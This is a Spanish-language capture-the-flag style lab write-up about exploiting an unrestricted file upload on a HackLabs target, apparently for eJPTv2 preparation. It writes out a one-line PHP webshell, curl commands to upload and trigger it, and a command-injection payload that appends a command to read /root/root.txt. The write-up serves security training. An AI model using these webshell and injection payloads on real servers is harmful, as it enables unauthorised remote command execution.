# 📁 Informe de Laboratorio: HackLabs - File Upload sin restricciones (Easy)
**IP Objetivo:** 10.10.10.101 | **Fecha:** 23/04/2026 | **Objetivo:** Preparación eJPTv2

## 🎯 Objetivo
Demostrar la vulnerabilidad de subida de archivos sin restricciones y lograr ejecución remota de comandos (RCE) en el servidor HackLabs.

## 🔍 Fase 1: Enumeración
- Se identificó un formulario de subida de archivos en `http://10.10.10.101/upload`.
- El formulario permite subir archivos de cualquier tipo sin validación de extensión ni `Content-Type`.

## 💥 Fase 2: Explotación (Metodología Oficial)
- **Vulnerabilidad:** Subida de archivos sin restricciones.
- **Pasos de explotación esperados:**
    1.  Crear una webshell PHP: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
    2.  Subir el archivo: `curl -F "file=@shell.php" http://10.10.10.101/upload`
    3.  Ejecutar comandos: `curl "http://10.10.10.101/uploads/shell.php?cmd=id"`
- **Problema encontrado:** El servidor (Flask) no ejecuta PHP en el directorio `uploads/`, forzando la descarga del archivo. Las extensiones alternativas (`.php5`, `.phtml`, `.phar`) tampoco eran ejecutadas.

## 🚀 Fase 3: Bypass y Explotación Real (Cross-Lab Exploitation)
- **Técnica:** Se aprovechó la vulnerabilidad de **Command Injection** (laboratorio A03) para ejecutar comandos directamente como `root` en el mismo contenedor Docker.
- **Descubrimiento:** El directorio raíz del servidor Flask era `/app/`, no `/var/www/html/`.
- **Payload final:** `10.10.10.5; cat /root/root.txt` en el campo de ping del laboratorio A03.

## 🚩 Fase 4: Captura de la Flag
- **Ubicación:** `/root/root.txt`
- **Payload utilizado:** Command Injection desde el laboratorio A03.
- **Contenido de la flag:** `HL{r00t_pr1v3sc_succ3ss}`

## 🧠 Lecciones Aprendidas
1.  **Defensa en profundidad:** El servidor implementó una protección (no ejecutar PHP en `uploads/`), lo que anuló la explotación directa de File Upload.
2.  **Cross-Lab Exploitation:** En entornos reales, las vulnerabilidades no existen de forma aislada. Una falla en un componente puede comprometer todo el sistema.
3.  **Flexibilidad:** Cuando un vector de ataque falla, es crucial pivotar y aprovechar otros hallazgos previos.
4.  **Metodología oficial vs. Realidad:** La guía del laboratorio asume un servidor Apache con PHP. En la práctica, el entorno era Flask, lo que requirió adaptar el ataque.

## 🏁 Conclusión
Aunque la explotación directa de File Upload fue frustrada por la configuración del servidor, se logró el objetivo final de leer la flag aprovechando una vulnerabilidad de Command Injection en otro laboratorio. Esto demuestra la importancia de mantener una visión global del sistema durante una auditoría y no rendirse ante las protecciones implementadas.
